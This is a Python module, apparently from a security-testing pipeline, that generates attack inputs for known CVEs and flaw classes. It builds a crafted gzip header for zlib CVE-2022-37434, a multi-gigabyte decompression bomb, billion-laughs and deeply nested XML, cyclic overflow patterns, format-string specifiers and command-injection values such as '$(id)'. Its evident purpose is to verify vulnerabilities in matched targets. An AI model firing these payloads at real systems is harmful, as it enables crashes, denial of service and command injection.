"""Per-CVE weaponization: concrete, parameterized triggers for specific known CVEs.

A version match says a component is KNOWN-vulnerable; a trigger turns that into an actual input
that exercises the flaw. These are hand-authored per CVE (there is no general recipe from a CVE
id to an exploit), registered by CVE id, and consumed by the `cve_poc` stage, which feeds the
trigger to a matched target and records a VERIFIED PoC only if the target actually faults -- so a
fixed/unaffected target is never falsely flagged.

Each trigger returns a Trigger: the input bytes, how to feed them (stdin/arg/file/stdin-slow),
the CWE, and a human note. stdlib based.
"""
from __future__ import annotations

import struct
import zlib
from dataclasses import dataclass, field


@dataclass
class Trigger:
    cve: str
    data: bytes
    channel: str = "stdin"          # stdin | file | arg | stdin-slow (byte-dribble)
    cwe: str = "CWE-787"
    note: str = ""
    libraries: tuple = field(default_factory=tuple)   # which detected libs this applies to


def _cve_2022_37434(extra_len: int = 0x1000) -> Trigger:
    """zlib CVE-2022-37434: a heap buffer over-read/overflow in inflate() when a gzip header has
    an oversized EXTRA field (FEXTRA) and the application supplied a small `extra` buffer to
    inflateGetHeader(). Pre-1.2.12 inflate copies into head->extra past head->extra_max. The
    trigger is a gzip stream whose FEXTRA XLEN far exceeds any reasonable extra_max; feeding it a
    byte at a time (channel 'stdin-slow') maximises the chance the copy spans the boundary."""
    xlen = extra_len & 0xFFFF
    flg = 0x04                                   # FEXTRA
    hdr = b"\x1f\x8b\x08" + bytes([flg]) + b"\x00\x00\x00\x00" + b"\x00\xff"
    hdr += struct.pack("<H", xlen) + (b"A" * xlen)
    co = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw deflate body (empty payload)
    body = co.compress(b"") + co.flush()
    trailer = struct.pack("<II", zlib.crc32(b"") & 0xFFFFFFFF, 0)
    data = hdr + body + trailer
    return Trigger(cve="CVE-2022-37434", data=data, channel="stdin-slow", cwe="CWE-787",
                   libraries=("zlib",),
                   note=("gzip stream with an oversized FEXTRA extra field; triggers the "
                         "inflate() out-of-bounds write in zlib < 1.2.12 when the app uses "
                         "inflateGetHeader() with a small extra buffer"))


def _zip_bomb(expand_gb: int = 8) -> Trigger:
    """A decompression bomb (CWE-409): a few KB of gzip that inflate to many GB. A consumer that
    buffers the output without a cap exhausts memory and is OOM-killed. Streamed through the
    compressor so building it never holds the expanded data."""
    co = zlib.compressobj(9, zlib.DEFLATED, 15 + 16)   # gzip container
    chunk = b"\x00" * (1 << 20)
    out = bytearray()
    for _ in range(expand_gb * 1024):                  # expand_gb GiB of zeros, 1 MiB at a time
        out += co.compress(chunk)
    out += co.flush()
    return Trigger(cve="class:CWE-409", data=bytes(out), channel="stdin", cwe="CWE-409",
                   libraries=("zlib",),
                   note=f"decompression bomb (~{expand_gb} GiB expansion) -- DoS a consumer that "
                        f"inflates without an output cap")


def _xml_deep_nesting(depth: int = 60000) -> Trigger:
    """Deeply-nested XML elements (CWE-776, stack exhaustion): a recursive-descent parser recurses
    once per open tag, so tens of thousands of nested elements blow the stack and crash it. A
    DIFFERENT vector from entity expansion (billion-laughs) -- it trips parsers that cap entity
    amplification but not element depth. A crash (SIGSEGV from stack overflow) or an OOM/timeout
    under the tight cve_poc budget both count as the fault."""
    data = b'<?xml version="1.0"?>\n' + b"<a>" * depth + b"</a>" * depth
    return Trigger(cve="class:CWE-776", data=data, channel="file", cwe="CWE-776",
                   libraries=("expat", "libexpat", "libxml2", "expat2"),
                   note=f"{depth}-deep nested-element XML -- stack-exhaustion DoS of a recursive "
                        f"parser without a depth limit")


def _billion_laughs() -> Trigger:
    """XML entity-expansion DoS (CWE-776 'billion laughs'): nested entities expand to billions of
    characters, exhausting memory in a parser without an amplification limit. Modern expat/libxml2
    resist by default -- cve_poc records a result only on a real fault, so a protected parser is
    simply not flagged."""
    lines = ['<?xml version="1.0"?>', '<!DOCTYPE lolz [', ' <!ENTITY lol "lol">']
    for i in range(1, 10):
        prev = "lol" if i == 1 else f"lol{i - 1}"
        lines.append(f' <!ENTITY lol{i} "{("&" + prev + ";") * 10}">')
    lines.append(']>')
    lines.append('<lolz>&lol9;</lolz>')
    return Trigger(cve="class:CWE-776", data=("\n".join(lines)).encode(), channel="file",
                   cwe="CWE-776", libraries=("expat", "libexpat", "libxml2", "expat2"),
                   note="billion-laughs XML entity expansion -- DoS an XML parser without an "
                        "amplification limit")


# CVE id -> trigger factory. Add entries here to weaponize more version-matched CVEs.
_TRIGGERS = {
    "CVE-2022-37434": _cve_2022_37434,
}

# library name -> trigger factories that apply to ANY matched CVE of that library (format-level
# attacks a version match implies, independent of the specific CVE).
_LIBRARY_TRIGGERS = {
    "zlib": [_zip_bomb],
    "expat": [_billion_laughs, _xml_deep_nesting],
    "libexpat": [_billion_laughs, _xml_deep_nesting],
    "expat2": [_billion_laughs, _xml_deep_nesting],
    "libxml2": [_billion_laughs, _xml_deep_nesting],
}


def library_triggers(library: str) -> list:
    """Format-level Triggers that apply to any matched CVE of a given library."""
    return [fn() for fn in _LIBRARY_TRIGGERS.get((library or "").lower(), [])]


def for_cve(cve: str):
    """The hand-authored Trigger for a CVE id, or None when none is authored."""
    fn = _TRIGGERS.get((cve or "").upper())
    return fn() if fn else None


def available() -> set:
    return set(_TRIGGERS)


# ------------------------------------------------------------- generic CWE-class weaponization
# When a matched CVE has no bespoke trigger, its CWE still says WHAT KIND of flaw it is, which
# gives a best-effort input to try: a long cyclic payload for a buffer overflow, format
# specifiers for a format-string bug, shell metacharacters for a command injection. These are
# attempts, not guaranteed reproducers -- cve_poc records a result only if the target actually
# faults -- but they weaponize far more matched CVEs than hand-authoring alone.
def _cyclic(n: int) -> bytes:
    """A de Bruijn-ish cyclic pattern so a smashed return address is recognisable in a dump."""
    out = bytearray()
    a, b, c = 0x41, 0x61, 0x30
    while len(out) < n:
        out += bytes([a, b, c, 0x2e])
        c += 1
        if c > 0x39:
            c = 0x30; b += 1
        if b > 0x7a:
            b = 0x61; a += 1
    return bytes(out[:n])


_OVERFLOW_CWES = {"CWE-787", "CWE-121", "CWE-120", "CWE-119", "CWE-122", "CWE-125", "CWE-124",
                  "CWE-190", "CWE-131", "CWE-416", "CWE-788", "CWE-126"}
_FMT_CWES = {"CWE-134"}
_CMDI_CWES = {"CWE-78", "CWE-77"}
# Uncontrolled recursion / stack exhaustion: a recursive-descent parser that recurses per nesting
# level crashes (SIGSEGV) or hangs on a pathologically deep input. Bracket/paren/brace runs probe
# the common cases (JSON, expression and config parsers) without needing a specific grammar.
_RECURSION_CWES = {"CWE-674", "CWE-776"}


@dataclass
class PlanItem:
    label: str                      # human label for the recorded finding
    trigger: Trigger
    confidence: float
    group: str = ""                 # "" = always try; else stop at first fault within the group


def weaponization_plan(matched) -> list:
    """The ordered weaponization steps for a target's version-matched CVEs, as PlanItems. PURE
    (no detonation), so the selection -- which is the whole CVE->exploit chain -- is unit-testable
    independent of a live target.

    `matched` is an iterable of (cve_id, library, cwe). The plan is, in fidelity order:
      1. hand-authored CVE-specific triggers (confidence 0.95, always tried)
      2. library-level format triggers per distinct matched library (0.85) -- e.g. a zlib bomb or
         XML billion-laughs; the version match alone implies these format-level attacks
      3. generic CWE-class triggers per distinct CWE, for CVEs WITHOUT a bespoke trigger (0.80)
    Steps 2 and 3 carry a `group` so the stage records one reproduction per library / per CWE
    (the first that faults) rather than every payload. A fixed/unaffected target simply never
    faults and is never flagged -- the plan is attempts, the stage records only real faults."""
    matched = [(str(c or "").upper(), (lib or "").lower(), (cwe or "").upper())
               for c, lib, cwe in matched]
    plan: list = []
    # 1) bespoke, CVE-specific
    for cve, _lib, _cwe in matched:
        trig = for_cve(cve)
        if trig is not None:
            plan.append(PlanItem(cve, trig, 0.95))
    # 2) library-level, once per distinct library
    seen_lib = set()
    for cve, lib, _cwe in matched:
        if not lib or lib in seen_lib:
            continue
        seen_lib.add(lib)
        for trig in library_triggers(lib):
            plan.append(PlanItem(f"{cve} ({lib} {trig.cwe})", trig, 0.85, group=f"lib:{lib}"))
    # 3) CWE-class, once per distinct CWE, for CVEs with no bespoke trigger
    seen_cwe = set()
    for cve, _lib, cwe in matched:
        if for_cve(cve) is not None or not cwe or cwe in seen_cwe:
            continue
        seen_cwe.add(cwe)
        for trig in class_triggers(cwe):
            plan.append(PlanItem(f"{cve} ({cwe} class)", trig, 0.80, group=f"cwe:{cwe}"))
    return plan


def class_triggers(cwe: str) -> list:
    """Best-effort Triggers implied by a CWE class (no specific CVE needed). Fed over stdin/file/
    arg; recorded only on a real fault."""
    cwe = (cwe or "").upper()
    out = []
    if cwe in _OVERFLOW_CWES:
        for n in (256, 1024, 4096, 16384):
            for ch in ("stdin", "file", "arg"):
                out.append(Trigger(cve=f"class:{cwe}", data=_cyclic(n), channel=ch, cwe=cwe,
                                   note=f"generic overflow probe ({n}B cyclic) for {cwe}"))
    elif cwe in _FMT_CWES:
        for pat in (b"%n%n%n%n%n%n%n%n", b"%p" * 32, b"%s%s%s%s%s%s", b"%99999$n"):
            for ch in ("stdin", "arg", "file"):
                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
                                   note=f"generic format-string probe for {cwe}"))
    elif cwe in _CMDI_CWES:
        for pat in (b";id\n", b"`id`", b"$(id)", b"| id", b"&& id"):
            for ch in ("arg", "stdin", "file"):
                out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
                                   note=f"generic command-injection probe for {cwe}"))
    elif cwe in _RECURSION_CWES:
        for opener in (b"[", b"(", b"{", b"<a>"):
            for n in (50000, 200000):
                for ch in ("stdin", "file"):
                    out.append(Trigger(cve=f"class:{cwe}", data=opener * n, channel=ch, cwe=cwe,
                                       note=f"deep-recursion probe ({n}x {opener!r}) for {cwe}"))
    return out
